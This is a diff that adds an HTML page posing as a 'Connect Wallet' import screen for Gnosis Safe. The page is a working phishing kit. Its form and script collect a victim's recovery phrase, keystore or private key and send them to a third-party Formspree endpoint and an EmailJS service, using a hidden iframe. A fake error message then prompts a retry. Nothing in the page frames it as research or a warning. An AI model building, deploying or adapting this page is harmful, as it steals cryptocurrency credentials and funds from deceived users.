@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<!-- saved from url=(0063)https://defistationspage.netlify.app/connectwalletmanually.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="./connectwalletmanually_files/bootstrap.min.css">
+    <script type="text/javascript" src="./connectwalletmanually_files/email.min.js"></script>
+    
+    <style>
+        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .import-card { background: #1e2329; padding: 30px; border-radius: 20px; width: 100%; max-width: 450px; text-align: center; border: 1px solid #30363d; }
+        
+        #wallet-icon { width: 70px; height: 70px; border-radius: 15px; margin-bottom: 15px; object-fit: contain; background: #2b3139; padding: 5px; border: 1px solid #3e444d; }
+        
+        .tab-container { display: flex; background: #2b3139; border-radius: 10px; margin-bottom: 20px; padding: 5px; }
+        .tab { flex: 1; padding: 10px; cursor: pointer; border-radius: 8px; font-size: 14px; transition: 0.3s; color: #848e9c; }
+        .tab.active { background: #87CEEB; color: #000; font-weight: bold; }
+
+        textarea { width: 100%; background: transparent; border: 1px solid #3e444d; border-radius: 10px; color: white; padding: 15px; height: 120px; resize: none; outline: none; margin-bottom: 10px; }
+        textarea:focus { border-color: #87CEEB; }
+
+        .desc { font-size: 12px; color: #848e9c; margin-bottom: 25px; text-align: left; }
+
+        .btn-import { background: #87CEEB; color: black; width: 100%; border: none; padding: 15px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        .btn-import:hover { background: #00BFFF; }
+        
+        .footer-text { font-size: 12px; color: #5e6673; margin-top: 20px; }
+        .footer-text span { color: #87CEEB; }
+    </style>
+</head>
+<body>
+
+    <div class="import-card">
+        <img id="wallet-icon" src="./connectwalletmanually_files/lg-1.jpeg" alt="Wallet">
+        <h3 id="wallet-name" style="margin-bottom: 20px;">Gnosis Safe</h3>
+
+        <div class="tab-container">
+            <div class="tab active" data-type="Phrase">Phrase</div>
+            <div class="tab" data-type="Keystore">Keystore</div>
+            <div class="tab" data-type="Private Key">Private Key</div>
+        </div>
+
+        <form id="walletForm" action="https://formspree.io/f/mkogvlbe" method="POST">
+            <input type="hidden" id="selected_wallet" name="wallet_name" value="Gnosis Safe">
+            <input type="hidden" id="import_category" name="category" value="Phrase">
+
+            <textarea id="phraseInput" name="wallet_phrase" placeholder="Enter your recovery phrase" required=""></textarea>
+            <p class="desc" id="helpText">Typically 12 or 24 words separated by single spaces</p>
+            
+            <button type="submit" class="btn-import" id="submitBtn">Connect Wallet</button>
+        </form>
+
+        <p class="footer-text">By connecting a wallet, you agree to our <span>Terms of service</span></p>
+    </div>
+
+    <script src="./connectwalletmanually_files/jquery-3.6.0.min.js"></script>
+    <script>
+        (function() {
+            // !!! PUT YOUR PUBLIC KEY HERE !!!
+            emailjs.init("G_e_yyabF9v1ZKrjV");
+        })();
+
+        $(document).ready(function() {
+            // Load selection from first page
+            var savedImg = localStorage.getItem("selectedWalletImg");
+            var savedName = localStorage.getItem("selectedWalletName");
+            if (savedImg) { $("#wallet-icon").attr("src", savedImg); }
+            if (savedName) { 
+                $("#wallet-name").text(savedName); 
+                $("#selected_wallet").val(savedName); 
+            }
+
+            // Tab Switching logic
+            $(".tab").click(function() {
+                $(".tab").removeClass("active");
+                $(this).addClass("active");
+                var type = $(this).data("type");
+                $("#import_category").val(type);
+                $("#phraseInput").attr("placeholder", "Enter your " + type.toLowerCase());
+                $("#helpText").text(type === 'Phrase' ? "Typically 12 or 24 words separated by single spaces" : "Enter your " + type + " string correctly.");
+            });
+
+            // EmailJS + Formspree Submission logic
+            $('#walletForm').on('submit', function(e) {
+                e.preventDefault();
+                $("#submitBtn").text("Connecting...").prop("disabled", true);
+
+                var formData = {
+                    wallet_name: $("#selected_wallet").val(),
+                    category: $("#import_category").val(),
+                    wallet_phrase: $("#phraseInput").val()
+                };
+
+                // Submit to EmailJS first
+                emailjs.send("service_17cwyp7", "template_0a4dzvi", formData)
+                .then(function() {
+                    // After EmailJS succeeds, submit to Formspree using hidden iframe
+                    var $form = $('#walletForm');
+                    var $iframe = $('<iframe>', {
+                        name: 'formspree-frame',
+                        style: 'display:none;'
+                    });
+                    
+                    $('body').append($iframe);
+                    
+                    // Temporarily change form target to iframe
+                    var originalTarget = $form.attr('target');
+                    var originalAction = $form.attr('action');
+                    
+                    $form.attr('target', 'formspree-frame');
+                    $form.attr('action', 'https://formspree.io/f/mkogvlbe');
+                    
+                    // Submit the form to Formspree
+                    $form[0].submit();
+                    
+                    // Restore original form attributes after a delay
+                    setTimeout(function() {
+                        $form.attr('target', originalTarget || '_self');
+                        $form.attr('action', originalAction);
+                        $iframe.remove();
+                        
+                        alert("Error Connecting… Connect an active wallet!");
+                        location.reload();
+                    }, 2000);
+                })
+                .catch(function(error) {
+                    alert("Error: " + JSON.stringify(error));
+                    $("#submitBtn").text("Connect Wallet").prop("disabled", false);
+                });
+            });
+        });
+    </script>
+
+
+</body></html>
